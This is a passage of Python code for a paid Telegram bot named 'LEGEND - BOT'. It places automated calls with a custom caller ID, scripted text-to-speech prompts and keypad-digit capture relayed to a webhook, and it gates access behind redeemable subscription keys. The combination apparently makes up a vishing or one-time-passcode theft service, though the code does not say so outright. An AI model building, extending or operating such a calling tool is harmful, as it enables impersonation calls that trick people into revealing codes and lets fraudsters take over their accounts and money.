@dp.callback_query_handler(lambda c: c.data == 'admin_remove_admin')
async def handle_remove_admin(callback_query: types.CallbackQuery):
    chat_id = callback_query.message.chat.id

    # Check if the user is an admin
    if chat_id not in YOUR_ADMIN_IDS:
        await callback_query.answer('❌ You do not have admin privileges.')
        return

    # Ask the current admin for the chat ID of the admin to remove
    await callback_query.message.reply('Please enter the chat ID of the admin you want to remove.')
    
    # Store that this admin is currently in the process of removing an admin
    pending_admin_removals[chat_id] = True

# After the admin provides the admin chat ID to remove
@dp.message_handler(lambda message: message.chat.id in pending_admin_removals)
async def remove_admin(message: types.Message):
    current_admin_id = message.chat.id

    # Validate the chat ID of the admin to remove
    try:
        admin_to_remove = int(message.text)
        if admin_to_remove not in YOUR_ADMIN_IDS:
            await message.reply(f'⚠️ User {admin_to_remove} is not an admin.')
        else:
            YOUR_ADMIN_IDS.remove(admin_to_remove)
            await message.reply(f'✅ User {admin_to_remove} has been removed as an admin.')
            logging.info(f"Admin {current_admin_id} removed {admin_to_remove} as an admin.")
    except ValueError:
        await message.reply('❌ Invalid chat ID. Please enter a valid number.')

    # Remove the pending state for this admin
    del pending_admin_removals[current_admin_id]


@dp.callback_query_handler(lambda c: c.data == 'admin_generate_key')
async def handle_generate_key(callback_query: types.CallbackQuery):
    chat_id = callback_query.message.chat.id

    # Check if the user is an admin
    if chat_id not in YOUR_ADMIN_IDS:
        await callback_query.answer('❌ You do not have admin privileges.')
        return

    # Generate a new subscription key
    key = os.urandom(16).hex()  # Example key generation
    expiry_time = datetime.datetime.now() + datetime.timedelta(days=30)
    db.insert_key(key, None, expiry_time.strftime("%Y-%m-%d %H:%M:%S"))  # Store in the database

    await callback_query.message.reply(f'🔑 New subscription key generated: {key} (valid for 30 days)')



# Asynchronous hangup function
async def async_hangup_call(uuid):
    url = ""  # URL without the query parameter
    
    async with aiohttp.ClientSession() as session:
        try:
            logging.info(f"Sending hangup request to {url} with UUID: {uuid}")
            payload = {"uuid": uuid}  # JSON body containing the UUID
            async with session.post(url, json=payload) as response:  # Send the UUID in the body
                response_text = await response.text()
                logging.info(f"Hangup call response status: {response.status}")
                logging.info(f"Hangup call response content: {response_text}")
                
                # Check if the response status is 200 OK
                if response.status == 200:
                    return {"status": "success"}
                else:
                    logging.error(f"Hangup failed with status {response.status} and content: {response_text}")
                    return {"status": "failed", "response": response_text}
                
        except aiohttp.ClientError as e:
            logging.error(f"Client error occurred during hangup: {e}")
            return {"error": f"Client error occurred: {e}"}
        except Exception as e:
            logging.error(f"Unexpected error during hangup: {e}")
            return {"error": f"Unexpected error: {e}"}


async def hold_call(uuid):
    url = f"https://articunoapi.com:8443/hold?uuid={uuid}"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url) as response:
                response.raise_for_status()
                return await response.json()
        except aiohttp.ClientError as e:
            logging.error(f"Error holding call: {e}")
            return None
#keycheck
async def check_key_expiry():
    all_keys = db.get_all_keys()
    current_time = datetime.utcnow()

    for key_data in all_keys:
        expiry_time = datetime.strptime(key_data['expiry_time'], "%Y-%m-%d %H:%M:%S")  # Assuming the expiry time is stored as a string
        if current_time > expiry_time:
            db.remove_key_and_user(key_data['key'], key_data['user_id'])
            print(f"Key {key_data['key']} for user {key_data['user_id']} has expired.")

async def create_call_api(api_key, callback_url, to_number, from_number, name, scriptname, chatid, maxdigits, secmax):
    try:
        url = "https://articunoapi.com:8443/create-call"
        webhook_url = f"{callback_url}/webhook/{chatid}/{scriptname}/{maxdigits}/{secmax}"
        payload = {
            "api_key": api_key,
            "callbackURL": webhook_url,
            "to_": to_number,
            "from_": from_number,
            "name": name,
            "maxdigits": maxdigits,  # Add maxdigits to the payload
            "secmax": secmax  # Add secmax to the payload
        }

        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload) as response:
                response.raise_for_status()  # Raises an exception for 4xx/5xx errors
                data = await response.json()
                if 'uuid' in data:
                    return data
                else:
                    return None

    except aiohttp.ClientError as e:
        logging.error(f"Error creating call: {e}")
        return None


@dp.callback_query_handler(lambda c: c.data and c.data.startswith('recall_'))
async def handle_recall(callback_query: types.CallbackQuery):
    try:
        # Parse the callback data
        data_parts = callback_query.data.split('_')

        # Ensure the callback data is in the correct format
        if len(data_parts) != 8:
            await callback_query.answer('⚠️ Invalid recall data. Please try again.')
            return

        _, chatid, destination_number, caller_id, name, scriptname, maxdigits, secmax = data_parts

        # Inform the user that the recall is being processed
        await callback_query.answer('🔄 Recalling the call, please wait...')

        # Recreate the call using the same parameters
        response = await create_call_api(API_KEY, NGROK_URL, destination_number, caller_id, name, scriptname, chatid, maxdigits, secmax)

        if response and 'uuid' in response:
            uuid = response['uuid']

            # Store the new UUID for the chat session
            db.store_session(int(chatid), uuid)

            # Create a new markup with Hangup and Recall buttons
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton('❌ Hangup', callback_data=f'hangup_{uuid}'),
                InlineKeyboardButton('🔁 Recall', callback_data=f'recall_{chatid}_{destination_number}_{caller_id}_{name}_{scriptname}_{maxdigits}_{secmax}')
            )

            # Send a new message with the call controls
            await bot.send_message(
                chat_id=callback_query.message.chat.id,  # Use the correct chat ID
                text='📞 *Call recalled successfully!*', 
                reply_markup=markup, 
                parse_mode="Markdown"
            )

        else:
            # Handle the case where the API call failed
            error_message = response.get('error', 'Unknown error')
            await callback_query.answer(f'⚠️ Failed to recall the call. Error: {error_message}')

    except Exception as e:
        logging.error(f"An error occurred during recall: {e}")
        # Provide a friendly error message to the user
        await callback_query.answer('❌ An error occurred during recall. Please try again later.')





user_locks = {}

@dp.message_handler(commands=["create_call"])
async def create_call(message: types.Message):
    chat_id = message.chat.id

    # Ensure the user is subscribed
    if chat_id not in subscribed_users:
        await message.reply('🔒 *You need to subscribe to the bot to use this feature.*\n\n_Stay connected and get access to premium features by subscribing._', parse_mode="Markdown")
        return

    # Initialize the lock for the user if not already created
    if chat_id not in user_locks:
        user_locks[chat_id] = asyncio.Lock()

    # Acquire the lock for the user to ensure only one call can be processed at a time
    lock = user_locks[chat_id]

    # If the lock is already held, it means an active call is ongoing
    if lock.locked():
        await message.reply("🚨 *Active call is ongoing.*\n\n_Please wait for the current call to finish before starting a new one._", parse_mode="Markdown")
        return

    # Proceed with the call inside the lock context
    async with lock:
        try:
            # Extracting arguments
            args = message.text.split(' ')[1:]
            if len(args) != 6:
                await message.reply('❌ *Invalid arguments.*\n\n_Use the following format:_\n`/create_call <destination_number> <caller_id> <name> <scriptname> <maxdigits> <secmax>`', parse_mode="Markdown")
                return

            destination_number, caller_id, name, scriptname, maxdigits, secmax = args

            # Validate numeric arguments
            if not maxdigits.isdigit() or not secmax.isdigit():
                await message.reply('⚠️ *maxdigits* and *secmax* should be numeric values.', parse_mode="Markdown")
                return

            # Inform user that the call is being processed
            processing_message = await message.reply("⏳ *Initiating your call...*", parse_mode="Markdown")

            # Call initiation (Assuming `create_call_api` exists)
            response = await create_call_api(API_KEY, NGROK_URL, destination_number, caller_id, name, scriptname, chat_id, maxdigits, secmax)

            if response is not None:
                # If the call was successfully initiated
                if 'uuid' in response:
                    uuid = response['uuid']
                    logging.info(f"Storing UUID {uuid} for chat_id {chat_id}")
                    db.store_session(chat_id, uuid)
                    stored_session = db.get_session(chat_id)
                    
                    if stored_session:
                        logging.info(f"Successfully stored and retrieved UUID: {stored_session['uuid']}")
                    else:
                        logging.error("Failed to store session in the database.")

                    # Create a structured markup with buttons for Hangup and Recall
                    markup = InlineKeyboardMarkup(row_width=2)
                    markup.add(
                        InlineKeyboardButton('❌ Hangup', callback_data=f'hangup_{uuid}'),
                        InlineKeyboardButton('🔄 Recall', callback_data=f'recall_{chat_id}_{destination_number}_{caller_id}_{name}_{scriptname}_{maxdigits}_{secmax}'),
                    )

                    # Send "Call initiated successfully" message along with the Call Control buttons
                    await bot.edit_message_text(
                        "📞 *Call initiated successfully!*\n\n_call is now active._",
                        chat_id,
                        processing_message.message_id,
                        reply_markup=markup,
                        parse_mode="Markdown"
                    )

                else:
                    await bot.edit_message_text('⚠️ *Call failed to initiate.*\n\n_No UUID was received, please try again._', chat_id, processing_message.message_id, parse_mode="Markdown")
            else:
                await bot.edit_message_text('⚠️ *Call failed to initiate.*\n\n_An unexpected error occurred, please try again._', chat_id, processing_message.message_id, parse_mode="Markdown")

        except Exception as e:
            logging.error(f"An error occurred during the call creation: {e}")
            await message.reply('❌ *An error occurred while processing your request.*\n\n_Please try again later._', parse_mode="Markdown")


@dp.message_handler(commands=["start"])
async def start(message: types.Message):
    user_first_name = message.from_user.first_name
    welcome_message = (
        f"✨ <b>Welcome to LEGEND - BOT</b> ✨\n\n"
        f"👋 <b>Hello, {user_first_name}!</b> Welcome aboard!\n\n"
        f"<b>🌟 About Us:</b>\n"
        f"Welcome to <b>LEGEND - BOT</b>, your reliable companion for advanced automated calling solutions. "
        f"Enjoy seamless communication with our cutting-edge services. 🚀\n\n"
        
        f"💎 <i>Our mission is to provide top-tier services at unbeatable prices, tailored for you!</i>\n\n"
        
        f"<b>🔧 Features at a Glance:</b>\n"
        f"🔹 <b>24/7 Customer Support</b> – Always available for assistance.\n"
        f"🔹 <b>Automated Payments</b> – Easy, secure, and quick transactions.\n"
        f"🔹 <b>Live Panel Overview</b> – Get real-time insights into your activity.\n"
        f"🔹 <b>Customizable Caller ID</b> – Personalize your calling experience.\n"
        f"🔹 <b>99.99% Uptime Guarantee</b> – Reliable and uninterrupted service.\n"
        f"🔹 <b>Script Customization</b> – Design scripts tailored to your needs.\n\n"
        
        f"<b>🚀 Essential Commands:</b>\n"
        f"⚙️ <b>/create_call</b> <i>&lt;destination_number&gt; &lt;caller_id&gt; &lt;name&gt; &lt;scriptname&gt;</i> - Start a call with custom parameters.\n"
        f"🔑 <b>/redeem</b> <i>&lt;key&gt;</i> - Redeem a key to unlock exclusive features.\n"
        f"👤 <b>/profile</b> - View and manage your profile information.\n"
        f"🛠️ <b>/create_script</b> <i>&lt;part1&gt; &lt;part2&gt; &lt;part3&gt; &lt;part4&gt; &lt;part5&gt;</i> - Create a custom calling script.\n"
        f"🎙️ <b>/list_voices</b> - Explore available voice options for your scripts.\n"
        f"🎤 <b>/set_voicename</b> <i>&lt;voice_name&gt;</i> - Set a specific voice for your calls.\n\n"
        
        f"<i>🔍 Discover new ways to enhance your communication experience!</i> 🌐\n"
    )

    # Inline buttons with clear labels and concise purpose
    inline_kb = InlineKeyboardMarkup(row_width=2)
    inline_kb.add(
        InlineKeyboardButton("📞 Contact Support", url=""),
        InlineKeyboardButton("💰 Purchase Credits", url=""),
        InlineKeyboardButton("📋 Pricing Info", url=""),  # Example guide link
    )

    await message.reply(welcome_message, parse_mode="HTML", reply_markup=inline_kb)


@dp.message_handler(commands=["redeem"])
async def subscribe(message: types.Message):
    try:
        key = message.text.split(" ")[1]
        db_key = db.get_key(key)
        if db_key:
            if db_key[1] is None:  # Check if the key has not been redeemed by any user yet
                db.update_key(key, message.chat.id, db_key[2])  # Update the key with the current user's ID
                subscribed_users.add(message.chat.id)
                response_message = (
                    "🎉 <b>Subscription Successful!</b>\n\n"
                    "✅ You have successfully subscribed to our service.\n"
                    "Enjoy all the premium features and benefits we offer! 🚀"
                )
                await message.reply(response_message, parse_mode="HTML")
            elif db_key[1] == message.chat.id:
                response_message = (
                    "🔔 <b>Already Subscribed</b>\n\n"
                    "ℹ️ You are already subscribed to our service. No need to subscribe again!"
                )
                await message.reply(response_message, parse_mode="HTML")
            else:
                response_message = (
                    "❌ <b>Key Already Redeemed</b>\n\n"
                    "⚠️ This subscription key has already been used by another user."
                )
                await message.reply(response_message, parse_mode="HTML")
        else:
            response_message = (
                "🚫 <b>Invalid Key</b>\n\n"
                "⚠️ The subscription key you entered is not valid. Please check and try again."
            )
            await message.reply(response_message, parse_mode="HTML")
    except IndexError:
        response_message = (
            "❗ <b>Missing Key</b>\n\n"
            "⚠️ Please provide a valid subscription key using the format: /redeem&lt;key&gt;"
        )
        await message.reply(response_message, parse_mode="HTML")


@dp.message_handler(commands=["generate_key"])
async def generate_key(message: types.Message):
    if message.chat.id not in YOUR_ADMIN_IDS:
        await message.reply('You are not authorized to generate subscription keys.')
        return
    
    try:
        # Extract and parse command arguments
        _, duration_str, unit = message.text.split(' ', 2)
        duration = int(duration_str)
        
        # Determine the expiry time based on unit (days or hours)
        if unit.lower() == 'days':
            expiry_time = datetime.now() + timedelta(days=duration)
        elif unit.lower() == 'hours':
            expiry_time = datetime.now() + timedelta(hours=duration)
        else:
            raise ValueError("Invalid unit. Use 'days' or 'hours'.")
        
        # Generate a secure random key
        key = os.urandom(16).hex()
        
        # Insert the key and expiry time into the database
        db.insert_key(key, None, expiry_time.strftime("%Y-%m-%d %H:%M:%S"))
        
        # Notify the user
        await message.reply(f'Generated subscription key: {key} (expires on {expiry_time.strftime("%Y-%m-%d %H:%M:%S")})')
    
    except (IndexError, ValueError) as e:
        await message.reply(f'Error: {e}. Please use /generate_key <duration> <days|hours>')


def get_available_voices():
    """Retrieve and return a list of available voices from Azure TTS."""
    try:
        speech_config = speechsdk.SpeechConfig(subscription=AZURE_SPEECH_KEY, region=AZURE_SPEECH_REGION)
        synthesizer = speechsdk.SpeechSynthesizer(speech_config=speech_config)
        
        voices = synthesizer.get_voices_async().get()
        
        if voices.reason == speechsdk.ResultReason.VoicesListRetrieved:
            return [voice for voice in voices.voices]
        else:
            print(f"Failed to retrieve voices. Reason: {voices.reason}")
            return []
    except Exception as e:
        print(f"Error retrieving voices: {e}")
        return []

@dp.message_handler(commands=["list_voices"])
async def list_voices(message: types.Message):
    # Fetch available voices
    available_voices = get_available_voices()

    if available_voices:
        # Group voices by country (locale)
        grouped_voices = {}
        for voice in available_voices:
            # Extract country code from locale
            country = voice.locale.split('-')[1].upper()
            if country not in grouped_voices:
                grouped_voices[country] = []
            grouped_voices[country].append(voice)

        # Filter to include only India, France, and USA
        allowed_countries = {'IN': 'India', 'FR': 'France', 'US': 'USA'}
        filtered_voices = {code: grouped_voices[code] for code in allowed_countries.keys() if code in grouped_voices}

        # Create inline keyboard with buttons for each allowed country
        keyboard = InlineKeyboardMarkup(row_width=2)
        for code, country_name in allowed_countries.items():
            if code in filtered_voices:
                button = InlineKeyboardButton(
                    text=f"{country_name} Voices ({len(filtered_voices[code])})",
                    callback_data=f"show_voices_{code}"
                )
                keyboard.add(button)

        # Send message with inline keyboard
        await message.reply(
            "🌍 <b>Select a country to view available voices:</b>",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
    
    else:
        await message.reply(
            "❌ <b>Failed to retrieve available voices.</b>",
            parse_mode="HTML"
        )

# Callback query handler for showing voices of a selected country
@dp.callback_query_handler(lambda c: c.data and c.data.startswith('show_voices_'))
async def show_voices(callback_query: types.CallbackQuery):
    country = callback_query.data.split('_')[-1]
    available_voices = get_available_voices()

    if available_voices:
        voices_in_country = [voice for voice in available_voices if voice.locale.split('-')[1].upper() == country]

        if voices_in_country:
            voice_list = "\n".join([f"🎤 <b>{voice.local_name}</b> ({voice.locale}) - <i>{voice.short_name}</i>" for voice in voices_in_country])
            await bot.send_message(callback_query.from_user.id, f"<b>{country} Voices:</b>\n\n{voice_list}", parse_mode="HTML")
        else:
            await bot.send_message(callback_query.from_user.id, f"❌ <b>No voices available for {country}.</b>", parse_mode="HTML")
    
    await callback_query.answer()


@dp.message_handler(commands=["create_script"])
async def create_script_command(message: types.Message):
    if message.chat.id not in subscribed_users:
        await message.reply('You need to subscribe to the bot to use this feature.')
        return
    await script.start_script_creation(message)

@dp.message_handler(lambda message: script.db.get_state(message.chat.id).get('script_id'))
async def handle_script_part(message: types.Message):
    await script.handle_part(message)

async def set_default_commands(dp):
    await dp.bot.set_my_commands([
        BotCommand("start", "Start the bot"),
        BotCommand("create_call", "Create a new call"),
        BotCommand("redeem", "Subscribe to the bot"),
        BotCommand("create_script", "Create a new script"),
        BotCommand("set_voicename", "set voice for script"),  # Ensure this command is listed here
        BotCommand("profile", "PROFILE"),
        BotCommand("list_voices", "list voice for script"),
    ])

async def run_bot_and_server():
    # Start the FastAPI server in a background task
    config = uvicorn.Config(app, host="0.0.0.0", port=5000)
    server = uvicorn.Server(config)
    loop = asyncio.get_event_loop()
    loop.create_task(server.serve())

    await notify_restart(dp)
    # Start bot polling in the main task
    await set_default_commands(dp)
    from aiogram import executor
    await dp.start_polling()

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(check_key_expiry())
    loop.create_task(periodic_key_check())
    loop.create_task(periodic_user_refresh())
    loop.run_until_complete(run_bot_and_server())


